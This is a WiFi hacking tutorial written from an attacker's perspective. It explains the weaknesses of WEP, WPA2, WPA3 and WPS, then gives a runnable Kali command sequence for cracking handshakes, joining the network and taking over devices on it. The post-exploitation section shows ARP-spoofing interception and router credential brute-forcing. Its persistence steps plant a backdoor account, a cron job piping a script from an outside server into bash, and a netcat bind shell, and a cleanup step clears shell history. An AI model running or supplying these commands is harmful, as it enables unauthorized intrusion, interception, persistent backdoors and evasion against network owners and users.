# INTRO - Wireless Security Protocols: A Hacker's Perspective

## **Why Understanding Protocols Matters**
Knowing wireless security protocols isn't academic—it's tactical. Each protocol represents a different attack surface, vulnerability profile, and cracking methodology. Your attack strategy changes completely based on which protocol you're facing.

---

## **The Evolution of Wireless Security**

### **1. WEP (Wired Equivalent Privacy) - The Broken Protocol**
**How it works:**
- Uses RC4 stream cipher with 40-bit or 104-bit keys
- Static shared key (everyone uses the same password)
- Weak 24-bit IV (Initialization Vector) that repeats
- No proper key management

**Why hackers love it:**
- **Completely broken** since 2001
- Can be cracked in minutes with enough IVs
- No authentication - just encryption
- Tools: `aircrack-ng`, `airreplay`

**Importance for hacking:**
- If you see WEP, it's basically an open network
- Capture 5,000-30,000 IVs and the password reveals itself
- Practice on WEP for confidence building

---

### **2. WPA (WiFi Protected Access) - The Temporary Fix**
**How it works:**
- TKIP (Temporal Key Integrity Protocol) encryption
- Still uses RC4 but with dynamic keys
- 48-bit IVs (better than WEP)
- MIC (Message Integrity Check) to prevent tampering

**Why it matters:**
- Response to WEP being broken
- Still vulnerable to dictionary attacks
- TKIP has known weaknesses (chop-chop attack)
- **WPA-Personal (PSK)** vs **WPA-Enterprise (RADIUS)**

**Hacking implications:**
- Can't crack via crypto flaws like WEP
- Must capture 4-way handshake
- Relies on password strength
- Enterprise version requires different attacks

---

### **3. WPA2 - The Current Standard (2004-Present)**
**How it works:**
- CCMP encryption with AES (strong crypto)
- Replaced TKIP (though backward compatible)
- 4-way handshake for key establishment
- PMK (Pairwise Master Key) derived from password

**Critical vulnerabilities:**
- **KRACK Attack** (Key Reinstallation Attack)
- Still vulnerable to handshake capture + dictionary attacks
- **WPS vulnerability** (WiFi Protected Setup)

**Why this is your main target:**
- 90% of networks use WPA2
- Success depends on password strength
- Handshake capture + wordlist = success
- PMKID attack (no clients needed)

---

### **4. WPA3 - The New Challenger (2018+)**
**How it works:**
- SAE (Simultaneous Authentication of Equals) handshake
- 192-bit encryption for enterprise
- Forward secrecy
- Protection against offline dictionary attacks

**Current hacking reality:**
- **Dragonblood vulnerabilities** (downgrade attacks)
- Still new and not widely adopted
- Requires different tools and techniques
- Most attacks target implementation flaws

---

### **5. WPS (WiFi Protected Setup) - The Backdoor Feature**
**How it works:**
- 8-digit PIN (7 digits + checksum)
- Router verifies PIN in two halves
- Designed for easy device connection
- Enabled by default on many routers

**The hacker's dream:**
- PIN can be brute-forced in hours
- **Pixie Dust attack** cracks instantly on vulnerable routers
- Works even with strong WPA2 passwords
- Many routers don't have lockout mechanisms

---

## **Protocol Identification in the Wild**
```bash
# What you'll see in airodump-ng:
# WEP: Shows "WEP" in ENC column
# WPA: Shows "WPA" or "WPA2" 
# WPA3: Shows "WPA3" (rare)

airodump-ng wlan0mon

# Example output:
# BSSID              PWR  Beacons  #Data  CH  ENC  CIPHER AUTH ESSID
# AA:BB:CC:DD:EE:FF  -45  100      45     6   WPA2 CCMP   PSK  HomeNetwork
```

---

## **Strategic Implications for Hackers**

### **Attack Decision Tree:**

```
Is it WEP? 
├── Yes → Capture IVs, crack with aircrack (5 minutes)
└── No → Continue

Is WPS enabled?
├── Yes → Try reaver/bully (1-10 hours)
└── No → Continue

WPA/WPA2?
├── Yes → Capture handshake, dictionary attack
│   ├── Weak password → Crack quickly
│   └── Strong password → Consider targeted wordlists
└── No

WPA3?
├── Yes → Dragonblood attacks or wait for clients
└── No → Open network or enterprise
```

---

## **Key Takeaways for This Tutorial:**

1. **WPA2-Personal** is your primary target - it's everywhere
2. **Handshake capture** is the critical skill to master
3. **Password strength** determines your success rate
4. **WPS** is a valuable alternative attack vector
5. **Enterprise networks** (WPA2-Enterprise) require completely different approaches

---

## **Why This Knowledge Matters:**

- **Efficiency**: Don't waste time on WPA3 if WPS is available
- **Success Rate**: Know which networks are actually crackable
- **Tool Selection**: Different protocols = different tools
- **Realism**: Understand what's possible in real-world scenarios

**Remember**: The protocol tells you *how* to attack, not *if* you should attack. Always have proper authorization.

This foundation explains why we focus on WPA2 handshake capture and WPS attacks in this tutorial—they're the most relevant and practical techniques for today's wireless networks.


# WPA2 4-Way Handshake: The Heart of WiFi Security

## **The Critical Moment of Connection**

The 4-way handshake is **the single most important process** in WPA2 security—and also its greatest vulnerability for attackers. When you successfully capture this handshake, you've essentially captured the "key" to crack the network password.

---

## **Why It Matters for WiFi Hacking**

1. **Attack Surface**: This is what we capture to crack passwords
2. **Vulnerability**: If we capture it, we can brute-force the password offline
3. **Opportunity**: Occurs every time a device connects/reconnects
4. **Stealth**: Can capture without being connected to the network

---

## **The Players in the Handshake**

- **Authenticator (AP)**: The WiFi router/access point
- **Supplicant (Client)**: Your phone/laptop connecting
- **PSK (Pre-Shared Key)**: The WiFi password (converted to 256-bit PMK)
- **PMK (Pairwise Master Key)**: `PBKDF2(SSID, Password, 4096, 256)` - The "master key"
- **PTK (Pairwise Transient Key)**: Session key for this specific connection

---

## **The 4-Way Handshake Step-by-Step**

### **Phase 1: Setup**
Before the handshake:
1. Client scans and finds AP
2. Open System Authentication (just formalities)
3. Association Request/Response
4. **NOW** the real security begins...

---

### **Step 1: AP → Client** 
```
AP sends: ANonce (Authenticator Nonce)
Purpose: "I'm alive, here's my random number"
```
- AP generates a 256-bit random number (ANonce)
- Contains: ANonce, AP MAC, Client MAC
- **What we capture**: This is Message 1 of the handshake

**Hacker Perspective**: We can't do much with just this, but we record it.

---

### **Step 2: Client → AP** 
```
Client sends: SNonce + MIC (Message Integrity Code)
Purpose: "Here's my random number, and proof I know the password"
```
- Client generates its own 256-bit random number (SNonce)
- Client now has: ANonce + SNonce + both MACs
- **Computes PTK** = PRF(PMK, ANonce, SNonce, AP MAC, Client MAC)
- Sends SNonce with MIC (encrypted with PTK to prove it has PMK)

**Critical for Hackers**: 
- This is the **golden message** - contains proof of password knowledge
- The MIC is like a "signature" made with the password
- We capture this to verify we have a valid handshake

---

### **Step 3: AP → Client** 
```
AP sends: GTK (Group Temporal Key) + MIC
Purpose: "You're authenticated, here's the broadcast key"
```
- AP computes same PTK (since it knows the password)
- Verifies the MIC from Step 2 - if valid, client knows password
- Sends GTK (for broadcast/multicast traffic) encrypted with PTK
- **Installs encryption keys** - data encryption begins after this

**Hacker Insight**: 
- AP now trusts the client
- If we capture this, we definitely have a complete handshake
- GTK is useful for decrypting broadcast traffic later

---

### **Step 4: Client → AP** 
```
Client sends: Acknowledgement
Purpose: "Got it, let's start talking securely"
```
- Client acknowledges receipt
- **Encryption is now active** for all future communications
- Connection established

---

## **Visual Representation**

```
        [CLIENT]                          [AP/ROUTER]
           |                                    |
           |         1. ANonce                  |
           |<-----------------------------------|
           |                                    |
           |       2. SNonce + MIC              |
           |----------------------------------->|
           |    (Proof of password knowledge)   |
           |                                    |
           |    3. GTK + Install PTK            |
           |<-----------------------------------|
           |    (Encryption starts)             |
           |                                    |
           |       4. Acknowledgement           |
           |----------------------------------->|
           |                                    |
        [ENCRYPTED DATA FLOW BEGINS]
```

---

## **The Mathematics Behind It (Simplified)**

### **Key Derivations:**

1. **PMK Generation** (Before handshake):
   ```
   PMK = PBKDF2(SHA1, Password, SSID, 4096, 256)
   ```
   - 4096 iterations of hashing (why cracking is slow)
   - Salt = SSID (why same password on different SSIDs gives different PMK)

2. **PTK Generation** (During handshake):
   ```
   PTK = PRF-HMAC-SHA1(PMK, "Pairwise key expansion",
                        Min(AP_MAC, Client_MAC) + 
                        Max(AP_MAC, Client_MAC) +
                        Min(ANonce, SNonce) + 
                        Max(ANonce, SNonce))
   ```
   - 384-bit key (128 for encryption, 128 for integrity, 128 for EAPOL)
   - Unique for each session

3. **MIC Calculation** (The "proof"):
   ```
   MIC = HMAC-SHA1(PTK[0:16], EAPOL message)
   ```
   - This is what we verify when cracking

---

## **Why This Makes WPA2 Crackable**

### **The Critical Flaw:**
The handshake **proves** the client knows the password (via MIC), but in doing so, it gives us a way to **verify password guesses offline**.

### **Attack Process:**
```
1. Capture: ANonce, SNonce, MAC addresses, MIC
2. For each password guess in wordlist:
   a. Compute PMK = PBKDF2(password, SSID, 4096, 256)
   b. Compute PTK = PRF(PMK, ANonce, SNonce, MACs)
   c. Compute expected MIC = HMAC(PTK, message)
   d. Compare with captured MIC
3. If match → Password found!
```

### **What Makes It Vulnerable:**
- **Offline attacks**: No limit on guess attempts
- **No salt variation**: Same nonces = same test every time
- **Fast verification**: Checking a guess is relatively quick

---

## **Real-World Capture Example**

```bash
# What aircrack-ng sees in a capture:
$ aircrack-ng capture.cap

# A successful handshake shows:
#  Index 1: BSSID=AA:BB:CC:DD:EE:FF ESSID=HomeNetwork
#  #Data  #Beacons  CH  MB  ENC  CIPHER AUTH  ESSID
#  45      100       6   54  WPA2 CCMP   PSK   HomeNetwork
#  
#  Choosing first network as target.
#  
#  Reading packets, please wait...
#  
#  Opening capture.cap
#  Read 1500 packets.
#  
#  #  BSSID              ESSID                     Encryption
#  1  AA:BB:CC:DD:EE:FF  HomeNetwork               WPA2 (1 handshake)
#  
#  **WPA HANDSHAKE CAPTURED!**
#  (This is what we look for!)
```

---

## **Hacker's Advantage: The Deauthentication Attack**

Since we need to capture the handshake, we can **force** it:

```bash
# Client is already connected
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# What happens:
# 1. Client gets kicked off network
# 2. Client automatically tries to reconnect
# 3. 4-way handshake occurs
# 4. We capture it!
```

**Timing is everything**: We run `airodump-ng` to capture, then `aireplay-ng` to trigger reconnection.

---

## **Modern Evolution: PMKID Attack**

**Even easier**: Some routers leak a hash (PMKID) in their beacon frames:

```
PMKID = HMAC-SHA1(PMK, "PMK Name" | MAC_AP | MAC_Client)
```

**Advantage for hackers**:
- No need to wait for clients
- No deauth needed
- Can capture from beacon/probe responses alone

```bash
# Capture PMKID with hcxdumptool
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
```

---

## **Why This Knowledge is POWER for Hackers**

1. **Capture Strategy**: Know exactly what to look for
2. **Tool Understanding**: Know why tools work the way they do
3. **Troubleshooting**: If cracking fails, know where to check
4. **Efficiency**: Don't waste time on incomplete captures

### **Quick Checklist for Successful Capture:**
- ✓ Have all 4 messages (or at least messages 1 & 2 with MIC)
- ✓ Correct BSSID and client MAC
- ✓ Enough data packets to verify
- ✓ Aircrack-ng reports "handshake captured"

---

## **In Practice: Your Attack Flow**

```
[Discover Network] → [Target Client] → [Deauth Attack] 
       ↓
[Capture Handshake] → [Verify Capture] → [Dictionary Attack]
       ↓
[Password Found] → [Connect to Network]
```

**Remember**: The 4-way handshake is the **ONLY** way to get cryptographically verifiable proof of the password in WPA2-Personal networks. Master capturing it, and you master WPA2 cracking.

This understanding separates script kiddies from real hackers—you now know **why** the tools work, not just **how** to use them.

# Advanced 45-Minute Kali Linux WiFi Hacking Tutorial

## Prerequisites
- Kali Linux installed (preferably 2024.4 or newer)
- WiFi adapter supporting monitor mode and packet injection
- Root privileges (use `sudo su` at beginning)
- Ethical hacking mindset (only test on YOUR own networks)

---

## Part 1: Wordlist Creation (10 minutes)

### 1.1 Using Crunch for Custom Wordlists

```bash
# Basic syntax: crunch <min> <max> <charset> -o <output>
crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o custom_list.txt

# Using charset.lst with different patterns
# List available charsets
crunch 1 1 -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space -o test_charset.txt

# Create WPA password pattern (common: 8-63 chars)
crunch 8 63 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -o wpa_list.txt

# Pattern-based wordlist (common WiFi patterns: phone numbers, dates)
crunch 10 10 -t 078%%%%%%% -o phone_list.txt  # UK mobile pattern
crunch 8 8 -t ddmmyyyy -o date_list.txt

# Generate 10GB of passwords (be careful with disk space)
crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha-numeric -b 10gb -o /tmp/10gb_list.txt
```

### 1.2 Using Cewl for Targeted Wordlists

```bash
# Basic website crawling (depth 2)
cewl -d 2 -m 5 -w company_words.txt https://target-company.com

# With login page spidering
cewl -d 2 --auth_type basic --auth_user admin --auth_pass password \
  -w auth_crawl.txt https://target-company.com/admin

# Extract names and emails for password variants
cewl -d 2 -n -e -w company_emails.txt https://target-company.com/team

# Create password mutations (requires cewl 5.4+)
cewl -d 1 -m 6 --with-numbers -w base_words.txt https://target-company.com
# Then use hashcat rules or John to mutate
```

### 1.3 Combining Wordlists

```bash
# Merge and sort unique
cat wordlist1.txt wordlist2.txt | sort -u > combined.txt

# Add common WiFi passwords
cat /usr/share/wordlists/rockyou.txt combined.txt | sort -u > mega_list.txt

# Filter by length for WPA
awk 'length($0) >= 8 && length($0) <= 63' mega_list.txt > wpa_filtered.txt
```

---

## Part 2: WiFi Reconnaissance & Attack (20 minutes)

### 2.1 Initial Setup and Recon

```bash
# Check network interfaces
ip a
# or
iwconfig

# Identify your WiFi interface (usually wlan0 or wlan1)
airmon-ng

# Kill interfering processes
airmon-ng check kill

# Enable monitor mode on wlan0
airmon-ng start wlan0
# New interface will be wlan0mon (or similar)

# Scan for networks
airodump-ng wlan0mon

# Targeted scan
airodump-ng --bssid TARGET_BSSID --channel 6 -w capture wlan0mon
```

### 2.2 WPA/WPA2 Handshake Capture

```bash
# Capture handshake (new terminal)
airodump-ng --bssid TARGET_BSSID --channel 6 --write handshake_capture wlan0mon

# Deauthentication attack to force handshake (in another terminal)
aireplay-ng --deauth 10 -a TARGET_BSSID -c CLIENT_MAC wlan0mon
# Or if no specific client:
aireplay-ng --deauth 10 -a TARGET_BSSID wlan0mon

# Verify handshake capture
aircrack-ng handshake_capture-01.cap -w /usr/share/wordlists/rockyou.txt
# Look for "KEY FOUND!" or verify with:
cap2hccapx handshake_capture-01.cap handshake.hccapx
hashcat -m 2500 handshake.hccapx /usr/share/wordlists/rockyou.txt
```

### 2.3 Cracking with Aircrack-ng

```bash
# Basic dictionary attack
aircrack-ng -w custom_list.txt -b TARGET_BSSID handshake_capture-01.cap

# Using multiple wordlists
aircrack-ng -w wordlist1.txt -w wordlist2.txt -b TARGET_BSSID capture.cap

# KoreK attack (slower but thorough)
aircrack-ng -K -w custom_list.txt capture.cap

# Save progress and resume
aircrack-ng -w custom_list.txt -b TARGET_BSSID --session my_session capture.cap
# Resume later with:
aircrack-ng --session my_session
```

### 2.4 WPS (WiFi Protected Setup) Attack

```bash
# Scan for WPS-enabled routers
wash -i wlan0mon

# Pixie Dust attack (if router vulnerable)
reaver -i wlan0mon -b TARGET_BSSID -vv -K 1

# Standard WPS pin attack
reaver -i wlan0mon -b TARGET_BSSID -vv -S -d 2 -l 30

# Using bully (alternative)
bully -b TARGET_BSSID -v 3 wlan0mon

# One command with optimized settings
reaver -i wlan0mon -b TARGET_BSSID -c 6 -L -f -N -vv
```

### 2.5 Joining the Network Once Cracked

```bash
# Create wpa_supplicant config
echo 'network={
    ssid="TARGET_SSID"
    psk="CRACKED_PASSWORD"
}' > /tmp/wifi.conf

# Stop monitor mode and return to managed
airmon-ng stop wlan0mon

# Connect using wpa_supplicant
wpa_supplicant -B -i wlan0 -c /tmp/wifi.conf -D nl80211

# Get IP address
dhclient wlan0

# Verify connection
iwconfig wlan0
ping -c 4 8.8.8.8
```

---

## Part 3: Post-Exploitation (10 minutes)

### 3.1 Network Discovery

```bash
# Discover your IP and network range
ip addr show wlan0

# Scan the network (assuming 192.168.1.0/24)
nmap -sn 192.168.1.0/24
# Or more aggressively:
nmap -sS -sV -O 192.168.1.0/24 -oA network_scan

# Identify the router (usually .1 or .254)
arp -a
route -n

# Find router MAC and manufacturer
arp -n | grep -E '192\.168\.1\.1|192\.168\.1\.254'
# Lookup MAC vendor:
curl -s "https://api.macvendors.com/$(arp -n 192.168.1.1 | awk '{print $3}')"
```

### 3.2 Router Identification & Default Credentials

```bash
# Fingerprint router
nmap -sS -sV -p 80,443,22,23 192.168.1.1

# Check for common admin interfaces
curl -I http://192.168.1.1
curl -I https://192.168.1.1

# Search for default credentials
# Method 1: Use router brands database
searchsploit "router model"
# Method 2: Online lookup (if internet available)
# Common formats: admin/admin, admin/password, admin/<blank>

# Automated tools
medusa -h 192.168.1.1 -U /usr/share/wordlists/common_users.txt -P /usr/share/wordlists/common_passwords.txt -M http -m DIR:/admin

# Check for known vulnerabilities
nmap --script http-enum,http-vuln* 192.168.1.1
```

### 3.3 Access Router and Extract Information

```bash
# Once credentials found, explore
# View connected devices
curl -u admin:password http://192.168.1.1/connected_devices.html

# Extract WiFi passwords from router (if possible)
curl -u admin:password http://192.168.1.1/wireless_settings.html

# Check for port forwarding rules
curl -u admin:password http://192.168.1.1/port_forwarding.html

# Look for UPnP vulnerabilities
nmap -sU -p 1900 --script upnp-info 192.168.1.1
```

### 3.4 Network Traffic Monitoring

```bash
# ARP spoofing for MITM (requires ip forwarding enabled)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Start arpspoof
arpspoof -i wlan0 -t 192.168.1.10 192.168.1.1
arpspoof -i wlan0 -t 192.168.1.1 192.168.1.10

# Capture traffic
tcpdump -i wlan0 -w captured_traffic.pcap

# Or use bettercap for advanced monitoring
bettercap -iface wlan0
# In bettercap: net.probe on; net.recon on; arp.spoof on; net.sniff on
```

### 3.5 Enable Persistence via SSH

```bash
# If you find an SSH server on router or device

# Method 1: Add SSH key
ssh user@192.168.1.10 "mkdir -p ~/.ssh && echo '$(cat ~/.ssh/id_rsa.pub)' >> ~/.ssh/authorized_keys"

# Method 2: Create backdoor user
ssh root@192.168.1.1 "useradd -m -s /bin/bash backdoor && echo 'backdoor:password123' | chpasswd"

# Method 3: Cron job persistence
ssh user@192.168.1.10 "echo '*/5 * * * * curl http://your-server.com/shell.sh | bash' | crontab -"

# Method 4: Systemd service persistence (Linux targets)
ssh root@192.168.1.10 "cat > /etc/systemd/system/persist.service << 'EOF'
[Unit]
Description=Persistence Service
After=network.target

[Service]
ExecStart=/bin/bash -c 'while true; do nc -lvp 4444 -e /bin/bash; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable persist.service
systemctl start persist.service"
```

---

## Part 4: Cleanup and Return to Normal (5 minutes)

### 4.1 Disable Monitor Mode

```bash
# Stop any monitoring/attacking processes
airmon-ng check kill

# Stop monitor interface
airmon-ng stop wlan0mon

# Alternative if having issues
pkill aireplay
pkill airodump
pkill wpa_supplicant

# Manually set interface back to managed
ip link set wlan0 down
iwconfig wlan0 mode managed
ip link set wlan0 up
```

### 4.2 Restart Network Services

```bash
# Restart NetworkManager
systemctl restart NetworkManager
# or
service network-manager restart

# Check interface status
iwconfig wlan0
# Should show "Mode:Managed"

# Test normal WiFi connection
nmcli device wifi list
nmcli device wifi connect "YOUR_NETWORK_SSID" password "YOUR_PASSWORD"
```

### 4.3 Clean Files and Logs

```bash
# Remove capture files
rm -f *.cap *.csv *.netxml *.hccapx

# Clear bash history (optional)
history -c
history -w

# Remove temporary files
rm -f /tmp/wifi.conf /tmp/*.txt

# Check for any leftover processes
ps aux | grep -E '(air|reaver|bully)'
kill -9 [PID]  # if any found
```

### 4.4 Final Verification

```bash
# Verify normal operation
systemctl status NetworkManager

# Test internet connectivity
ping -c 4 google.com

# Check all interfaces are in normal mode
iwconfig

# Verify no monitor interfaces
ip link show | grep mon
# Should return nothing
```

---

## Quick Reference Cheat Sheet

```bash
# Monitor mode quickstart
airmon-ng check kill
airmon-ng start wlan0
airodump-ng wlan0mon

# Handshake capture
airodump-ng --bssid BSSID -c CH -w capture wlan0mon
aireplay-ng --deauth 10 -a BSSID wlan0mon

# Cracking
aircrack-ng -w wordlist.txt capture-01.cap

# WPS attack
wash -i wlan0mon
reaver -i wlan0mon -b BSSID -vv

# Cleanup
airmon-ng stop wlan0mon
systemctl restart NetworkManager
```

---

## Important Notes

1. **Legal Compliance**: Only test networks you own or have written permission to test
2. **Adapter Compatibility**: Not all WiFi adapters support monitor mode and packet injection
3. **Wordlist Quality**: Success heavily depends on wordlist quality and relevance
4. **WPS Limitations**: Many modern routers have WPS disabled or lockout mechanisms
5. **Detection Risk**: These attacks are detectable by modern security systems

## Time Management
- 0-10min: Wordlist creation
- 10-30min: WiFi attacks and cracking
- 30-40min: Post-exploitation
- 40-45min: Cleanup and verification

This tutorial provides a comprehensive overview. Practice each technique in a controlled lab environment before attempting in real scenarios.
